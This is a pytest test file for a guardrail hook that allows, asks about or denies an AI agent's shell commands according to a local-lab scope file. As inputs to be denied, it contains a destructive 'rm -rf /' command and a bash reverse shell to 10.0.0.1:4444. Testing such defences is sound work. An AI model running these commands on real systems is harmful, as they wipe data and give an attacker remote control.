"""Smoke test for the deterministic PreToolUse hard rail ``hooks/guardrail.py``.

The hook is intentionally outside the Python package: it must run under a bare
interpreter and decide deny/ask/allow purely from the PreToolUse JSON on stdin
plus ``scope.yaml``.  These tests drive it as a real subprocess so the actual
enable-time behaviour is covered, and they pin the regression that the rail must
read the project's real ``scope.yaml`` schema (``rules: [{host, ...}]``) rather
than only the legacy ``in_scope``/``out_of_scope`` keys.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

HOOK = Path(__file__).resolve().parent.parent / "hooks" / "guardrail.py"

# The project's real scope.yaml schema: a rules list, dry-run local-lab posture.
RULES_SCOPE = """\
profile: local-lab
automation_allowed: false
dry_run: {dry_run}
rules:
  - host: 127.0.0.1
    schemes: [http]
    ports: [3000]
    allow_private: true
"""


def _run(tool: str, command: str, scope_path: Path, dry_run: bool = True) -> str:
    """Invoke the hook and return its permissionDecision (allow/ask/deny)."""
    event = {"tool_name": tool, "tool_input": {"command": command}}
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        env={"HERMES_SCOPE": str(scope_path), "HERMES_DRY_RUN": "on" if dry_run else "off"},
        timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    payload = json.loads(proc.stdout)
    return payload["hookSpecificOutput"]["permissionDecision"]


@pytest.fixture
def scope(tmp_path: Path):
    def _make(dry_run: bool = True) -> Path:
        path = tmp_path / "scope.yaml"
        path.write_text(RULES_SCOPE.format(dry_run="true" if dry_run else "false"))
        return path

    return _make


def test_dangerous_command_is_denied(scope) -> None:
    assert _run("Bash", "rm -rf /", scope()) == "deny"


def test_reverse_shell_is_denied(scope) -> None:
    assert _run("Bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", scope()) == "deny"


def test_out_of_scope_host_is_denied_via_rules_schema(scope) -> None:
    # Regression: in_scope is derived from ``rules[].host``; a host outside the
    # only rule (127.0.0.1) must be denied, not merely questioned.  Before the
    # schema fix the rail read an absent ``in_scope`` key and could only ask.
    assert _run("Bash", "curl http://evil.example.com/", scope(dry_run=False)) == "deny"


def test_in_scope_localhost_under_dry_run_asks(scope) -> None:
    assert _run("Bash", "curl http://127.0.0.1:3000/health", scope(dry_run=True)) == "ask"


def test_state_change_asks_when_dry_run_off(scope) -> None:
    decision = _run("Bash", "curl -X POST http://127.0.0.1:3000/orders", scope(dry_run=False))
    assert decision == "ask"


def test_benign_local_command_is_allowed(scope) -> None:
    assert _run("Bash", "ls -la ./artifacts", scope(dry_run=False)) == "allow"


def test_non_bash_tool_is_allowed(scope) -> None:
    assert _run("Read", "irrelevant", scope()) == "allow"
